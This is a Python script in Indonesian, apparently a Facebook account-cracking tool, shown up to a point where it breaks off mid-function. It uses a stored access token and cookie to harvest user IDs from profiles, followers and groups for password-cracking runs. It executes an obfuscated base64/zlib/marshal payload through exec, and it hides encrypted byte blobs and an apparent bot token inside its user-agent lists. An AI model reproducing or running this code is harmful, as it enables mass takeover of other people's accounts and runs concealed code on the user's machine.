#UTF-PYTHON-3 BUAT OLEH RIKSY - 27 April 2022

import os,sys
try:
	import rich
except ImportError:
	os.system('pip install rich')
	try:
		import rich
	except ImportError:
		os.sys.exit("[?] Maaf Ngab, Sepertinya Tidak Bisa Install Rich(Install Manual : python -m pip install rich &> /dev/null)")
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as iprint
from rich.panel import Panel
from rich.tree import Tree
from rich import print as rprint
from rich.progress import track
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import Task
from rich.progress import DownloadColumn,SpinnerColumn,TransferSpeedColumn
from rich import filesize, get_console
console = Console()
from rich.console import Group
from rich.markdown import Markdown
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich.box import DOUBLE, ROUNDED
from rich.padding import Padding
from rich.box import ROUNDED, Box
#from rich.box import loppp
#from rich.spinner import *
try:
	import os,sys
	try:
		import requests
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import bs4
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import stdiomask
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import mechanize
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import subprocess
		null = open(os.devnull, "w")
		insta = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
		if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
		null.close()
		musik_="Kontol"
	except:musik_="Jangan"
except:pass
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import sys, os, subprocess, platform, struct
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json
import requests as req
import time,random,json
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup
from random import choice as pilih
from concurrent.futures import ThreadPoolExecutor as __Kiky__
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from datetime import datetime
from urllib.parse import quote
from datetime import date
from urllib import request
#from get_useragents import useragents
#ua_lo = useragents.UserAgents(limit=2000)

#user_agents = ua_lo.GetUserAgents()
#random_ua = ua_lo.RandomUserAgents()

# --[WARNA]--
H = "#000000" # Hitam
M = "#FF0000" # Merah
I = "#00FF00" # Hijau
K = "#FFFF00" # Kuning
B = "#00C8FF" # Biru
U = "#AF00FF" # Ungu
P = "#FF00FF" # Pink
C = "#00FFFF" # Biru Muda
Q = "#FFFFFF" # Putih
J = "#FF8F00" # Jingga
A = "#AAAAAA" # Abu-Ab
O = "#FFA500" # OREN

# --[WARNAV2]--
p = '\x1b[0;97m' # PUTIH
m = '\x1b[0;91m' # MERAH
i = '\x1b[1;92m' # HIJAU
k = '\x1b[1;93m' # KUNING
b = '\x1b[1;94m' # BIRU
u = '\x1b[1;95m' # UNGU
c = '\x1b[0;96m' # BIRU MUDA
q='\x1b[0m'	# WARNA MATI
h = "\x1b[0;90m"     # Hitam
j = "\x1b[38;5;208m" # Jingga
a = "\x1b[38;5;248m" # Abu-Abu
o='\033[38;2;255;127;0;1m' #ORANGE

# --[WARNA DALAM]--
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"

#WARNA rick(kotak)
HH = "[#000000]" # Hitam
MM = "[#FF0000]" # Merah
II = "[#00FF00]" # Hijau
KK = "[#FFFF00]" # Kuning
BB = "[#00C8FF]" # Biru
UU = "[#AF00FF]" # Ungu
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Biru Muda
QQ = "[#FFFFFF]" # Putih
JJ = "[#FF8F00]" # Jingga
AA = "[#AAAAAA]" # Abu-Abu
OO = "[#FFA500]" # OREN

# PENGATURAN WAKTU/JAMZ
ses = requests.Session()
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
jamz = datetime.now().strftime('%H:%M:%S')
jam_ = datetime.now().strftime('%H%M%S')
jam__ = str(datetime.now().strftime("%d%m%Y"))
sys.stdout.write(f'\x1b[1;35m\x1b]2; ★ SCRIPT BY MR.RISKY ★\x07')
visitor=request.urlopen("https://api.countapi.xyz/hit/dumai-991/dark-fb")
ka=json.loads(visitor.read())



# KUMPULAN USER AGNET
ua01= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua02= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua03= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",b"\xaaJ\xdb\x81\x01\xfc\xa4\xcaG\xd8\x01\xca.(\x91\xa9c\xafb\xa6\xa6\x94/\xad\x82\x94\x84`\xd0\xbb\xe2\xaf\xe2\xba&\xb80s\xedl\xf5=C\x8caN\xdc0;$\xf0\xae&\xc7\xaeq7U\x8b\r[\x8cg\xd3\x88\xd74\xb8\x07\x9b2\x13\x95\\\xe3/N\x02\xfb@\xee/\x9c\x81\x1e(\x18\xec\xcd;\xab+M\xdb\x9a\xd3\xf9\xf4\x18#[@\xa4\xf0\xae\xb5\xfdZ\x07}\xa9\xff=\xa6\x14\xa4\r\x87@\xbb\xda\x04\xbd\xf6[\x14\x8f\x88Q\xed;\xc5\x9e2e`\xe5\xc7~~\x03\xf4\xb8\x12\n\xa4[\xd5R\xa5\x94(?l\x94\x0be$/K\xfc\x0c0\x83\x0eIN%\x9cx","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua04= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjg","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua09= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0",b'rJLw2/F3v0PfZ+F88lY2OO393v/jb/tn/9E8UqHfu+y5+fXQtMyf623eEXAumpu77SWYBSAkbzDsNmOGxO4qRbL4bSRcNzAYvVmnUoEh9s1SzlaPvdVYJOarnmlFTEPf6FKmEZwkS4hkdrFrJL9yMk4kSf8SjmhF1uswHbWNjoCTvTbCRXnJiUJidV8K0aCguz14iRl9Xw9Q76KAGt6m4xH3sckRYqgcrIu5wOJIhbKd5LKwmEB4WSbyFjrpgirsOaVMR7cWgAUclQdxNWZL+VLAQpNt3V4OtBUTFa2bfxkz4EUw2k/FNp3wjXia+fANSlCB0joFGzZiX/w9kPEEKoUkDQneV1ngvvZCTbA3gxeroxHtKIku/F6walDbrB7RVPyu04SpZ2rqSJmw87EmfaR/DfDylxjbV7QyBO/eTuTVHwloayU0cnouKV9Qer3mlPbtAe/KoAUcG40b2afoMPZ5VJq+P0jlXC0o5r+QrPH1Wxjz3HXGw2TWH6CjqcCtgL56PfVPppkZaSoGuoIlFrIYGvvDLvthj75bV/0ry9BMn75T57j58MChDtc1H8Yw53+/x9wxg3r6/C94ZxROynyKj7Edi2cQgK5CG5eixFCaQjEEop9Apkqqa2EiBQhx5OcgGHWRAA0mSmjkdxJe',"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua05= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua06= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ugen2,ugen,ugen_,ugen__=[],[],[],[]
link_app,prox_k,id_ri,idd,id,loop,ok,cp,yyy,apk_me,pass_,method,prox_,opsi_y,url_met,pass_man,fps,Id_Grub,bx = [],"",[100001316493597,100044347381124],[],[],0,[],[],"AKTIF","TIDAK","","",[],"DOWN","","","",[],0
#[100063690353340,110877271176800]
sistim=""
AnTi_rIkOd=""
def kotak(kata, wwe, wew):
	pertama = kata
	kedua = mark(pertama, style=wwe)
	sol().print(kedua, style=wew)
def folder():
	try:os.mkdir("data")
	except:pass
	try:os.mkdir("results")
	except:pass
def play_mpv(x):
	if "Jangan" == musik_ or musik_ == "Jangan":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass

def cek_apk_hasil_crk():
	cekfile_crk("results")
	nama_z = input(">--Nama File--> ")
	if nama_z == "":kotak("# JANGAN KOSONG KONTOL",M,Q);time.sleep(2);exit()
	try:total__ = len(open(nama_z,"r").readlines())
	except FileNotFoundError:kotak('# FILE TIDAK ADA',K,Q);exit()
	with __Kiky__(max_workers=10) as (form):
		for data in open(nama_z,"r").readlines():
			try:
				data = data.replace("\n","")
				try:user, pw = data.split("|")
				except:user, pw, coki = data.split("|")
				form.submit(get_apk, user,pw,coki)
			except:pass
	exit()
def zks(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
class open_role:
	def __init__(self):
		global tiktok,pupuk,puput
		try:
			tiktok = open("data/login.txt","r").read()
		except:pass
		try:
			pupuk = open("data/cookie.txt","r").read()
			puput = {'cookie':pupuk}
		except:pass
class Main():
	def __init__(self):
		os.system("clear")
		open_role();self.intro()
	def menu_del(self, kataa):
		iprint(Panel(f"{MM}MOHON MAAF MENU {QQ}[{CC}{kataa}{QQ}]{MM} INI BELUM TERSEDIA... BACK TO MENU", style=Q));time.sleep(3)
		Main()
	def intro(self):
		_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==gkogSPAwoUMwTcIPhcIcsaTqpUfu5khV8uwmqtixPTWQrCEDVyZxCytmkYfbxVXEzbLKPm36Ljb9sRtYvYJ5ndrRhbmlUcmF3WUsnJf27hnCrQfO6oAOmgL+7tnCpQ7+JqI9FqCJLpV6lYuN2iUMnJMCpBGZgQbHQdLWSlhEZmZmblpUZMFGTlhgZKF2CipuZIFGSliAkaFTMAsDELDAkZLxJe')) # File Anti Rikod
		now = datetime.now()
		hour = now.hour
		if hour < 4:
			waktu = "Selamat Dini Hari"
		elif 4 <= hour < 12:
			waktu = "Selamat Pagi"
		elif 12 <= hour < 15:
			waktu = "Selamat Siang"
		elif 15 <= hour < 17:
			waktu = "Selamat Sore"
		else:
			waktu = "Selamat Malam"
		try:token = open("data/login.txt","r").read()
		except:login()
		try:cookie = open("data/cookie.txt","r").read()
		except:pass
		try:
			xnxzx = ""+cookie
			zza = f"{i}Token{q} And {k}Cookie{q}"
		except:
			zza = f"{i}Token{q}"
		try:sh = requests.get('https://httpbin.org/ip').json()
		except:sh = {'origin':'-'}
		tod = f"""		     ___                __            ____  __\n	  	    / _ \ ___ _  ____  / /__  ____   / __/ / /\n		   / // // _ `/ / __/ /  '_/ /____/ / _/  / _ \ \n		  /____/ \_,_/ /_/   /_/\_\        /_/   /_.__/"""
		my_ = Tree("                                 ",highlight=True, hide_root=True)
		my__= my_.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")


		my_r = my__.add(f"{c}Mr.Risky{q}")
		my_rr= my_r.add(f"\r{k}My Github{q}")
		my_rr.add(f"{c}https://githuh.com/Dumai-991{q}")
		my_rr.add(f"{c}https://githuh.com/Dumai-200{q}")

		my_rrr=my_r.add(f"\r{i}My WhatsApp{q}")
		my_rrr.add(f"{b}6283893415477{q}")


		code="""Wans X Gans
Jeck X Nano
Xenzi Ganz
Radhin Al Haady
Zee K World
Moch Aang Ardiansyah XD"""
		pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
		my_rrrr=my_r.add(f"\r{b}My Team{q}")
		my_rrrr.add(Group(pyhon))


		my_rrrrr=my_r.add(f"\r{c}Information{q}")
		tod=my_rrrrr.add(f"{j}Grub WhatsApp{q}")
		tod.add(f"{b}https://chat.whatsapp.com/GOzdlYW8my4LlEKkscnxl1{q}")
		tod_=my_rrrrr.add(f"{j}Facebook Page(Halaman Facebook){q}")
		tod_.add(f"{b}https://www.facebook.com/101003905507650{q}")
		tod_.add(f"{b}https://www.facebook.com/110877271176800{q}")


		try:
			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			idz = zxc["id"]
		except:
			try:os.remove('data/login.txt')
			except:pass
			try:os.remove('data/cookie.txt')
			except:pass
			tod = f"""		     ___                __            ____  __\n	  	    / _ \ ___ _  ____  / /__  ____   / __/ / /\n		   / // // _ `/ / __/ /  '_/ /____/ / _/  / _ \ \n		  /____/ \_,_/ /_/   /_/\_\        /_/   /_.__/"""
			my_ = Tree("                                 ",highlight=True, hide_root=True)
			my__= my_.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")
			prints(my__)
			kotak("# TOKEN KADALUARSA", M, Q)
			os.sys.exit()
		data_=my_rrrrr.add(f"\r{k}Data-Data Facebook Anda{q}")
		data_.add(f"Username/Id       :{u}{nama}{q}")
		data_.add(f"Tanggal BerGabung :{u}{waktuu}{q}")
		data_.add(f"Ip Address        :{u}{str(sh['origin'])}{q}")
		data_.add(f"Login Menggunakan :{u}{zza}{q}")
		prints(my__)


		try:open("data/kata","r").read();print(f"{q}╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                            {i}SELAMAT DATANG YANG KE{k} {ka['value']} {q}                             ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝")
		except:open("data/kata","w").write("# SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)


		top = f"""01
02
03
04
05
06
07
08
09

00"""
		tip = f"""Crack Dari Public
Crack Dari Public{QQ}({KK}MASAL{QQ})
Crack Dari Follow
Crack Dari Random Email
Crack Dari Cari Nama Grub
Crack Dari Grub Anda(Joined)
Check Jumlah Teman
Check Hasil Crack
Check Options Akun Sesi

Log Out Dari Akun (Keluar)"""
		lpp = f"""{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN

{II}ONN"""
		tod = me()
		tod.add_column("NO", style=K, justify='center')
		tod.add_column("PILIHAN", style=Q, justify='center',width=60)
		tod.add_column("STATUS", style=M, justify='center')
		tod.add_row(top,tip, lpp)
		sol().print(tod, justify='center')
		self.pilihan()
	def pilihan(self):
		ki = input(f'>--Pilih 1-8--> ')
#		if ki in ["1","01"]:self.public_v2();os.sys.exit()
		if ki in ["1","01"]:self.public();os.sys.exit()
		elif ki in ["2","02"]:self.public_mass();os.sys.exit()
		elif ki in ["3","03"]:self.follow();os.sys.exit()
		elif ki in ["4","04"]:self.random_email();os.sys.exit()
		elif ki in ["5","05"]:idt = input(f"{q}>--Nama Grub--> ");url=(f"https://mbasic.facebook.com/search/groups/?q={idt}&source=filter&isTrending=0");self.search_name_groups(url)
		elif ki in ["6","06"]:self.one_groups_joined();os.sys.exit()
		elif ki in ["7","07"]:self.cek_jumlah_teman();os.sys.exit()
		elif ki in ["8","08"]:self.rek();os.sys.exit()
		elif ki in ["9","09"]:self.cek_opsi();os.sys.exit()
		elif ki in ["00","00"]:self.logut()

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{ki}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),Main()
	def logut(self):
		try:os.remove('data/login.txt')
		except:pass
		try:os.remove('data/cookie.txt')
		except:pass
		kotak("# Token Dan Cookies Berhasil DiHapus (Berhasil Log Out)", M, Q)
		os.sys.exit()

	def ambil_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
			time.sleep(3)
			Main()
		return nama
	def ubah_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
			time.sleep(3)
			Main()
		return nama
	def ubah_user(self,username):
		try:
			if username == "me":
				return(username)
			else:
				url    = 'https://mbasic.facebook.com/' + username
				with requests.Session() as xyz:
					req = par(xyz.get(url,cookies=puput).content,'html.parser')
					kut = req.find('a',string='Lainnya')
					id = str(kut['href']).split('=')[1]
					id = id.replace("&refid","")
					id=id.replace("&paipv", "")
					# id = re.search('owner_id=(.*?)"',str(kut)).group(1)
					return(id)
		except Exception as e:return(username)
	def ubah_user1(self,idd):
			try:
				if idd == "me":idd = "me"
				else:
					payload = {"fburl": "https://free.facebook.com/{}".format(idd), "check": "Lookup"}
					if "facebook" in idd:
						payload = {"fburl": idd, "check": "Lookup"}
					mmk = requests.post("https://lookup-id.com/", data=payload).content
					xxx = par(mmk, "html.parser")
					idtt = xxx.find("span", id="code")
					asw = idtt.text
					idd = asw
			except:idd = idd
			return idd
	def search_name_groups(self,url):
		try:
			data = parser(ses.get(url,cookies=puput).text,"html.parser")
			inf = re.findall('\<a\ href\=\"https\:\/\/mbasic\.facebook\.com\/groups\/(.*?)\/\?refid\=.*?\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>\<\/div\>\<div\ class\=\".*?\">\<span\>(.*?)<\/span\>',str(data))
			post = re.findall('\<\/span\>\<\/div\>\<div\ class\=\".*?\">(.*?)<\/div\>',str(data))
			n = 0
			for x in inf:
				if "Grup Privat" in x:
					pass
				else:
					n += 1
					Id_Grub.append(x[0])
					url = parser(ses.get(f"https://mbasic.facebook.com/groups/{x[0]}").text,"html.parser")
					members = re.findall('Anggota<\/a\>\<\/td\>\<td\ class\=\".*?\">\<span\ class\=\".*?\" id\=\".*?\">(.*?)<\/span\>',str(url))[0]

					todz = me()
					todz.add_column("NO", style=I, justify="center")
					todz.add_column("NAMA DAN ID GRUB", style=I, justify="center",width=50)
					todz.add_column("TYPE GRUB", style=C, justify="center")
					todz.add_column("JUMLAH ANGGOTA GRUB", style=O, justify="center")
					todz.add_row(f"{n}",f'{BB}{x[1]}{II} | {UU}{x[0]}{QQ}',f"{x[2]}",f"{members}")
					sol().print(todz, justify='center')
		except:pass
		self.pilih_grub_()
		god=""
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()

	def pilih_grub_(self):
		global bx
		if len(Id_Grub) == 0:kotak("# MAAF BRO SEPERTINYA TIDAK ADA ID GRUB YANG TERKUMPUL",M,K);os.sys.exit()
		else:pass


		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=Q, justify="center", width=60)
		tod.add_row(f"1\n2",f"Dump 1 Grub ({II}Dipilih{QQ})\nDump Semua Grub")
		sol().print(tod, justify='center')
		plh = input(q+">--Pilih 1-2--> "+q)
		if "1" in plh:
			ask = input(f">--Pilih--> ")
			try:
				kotak("# UNTUK STOP DUMP TEKAM CTRL + C",I,Q)
				number = Id_Grub[int(ask)-1]
				url = "https://mbasic.facebook.com/groups/"+number
				self.dump_grup_no_login(url)
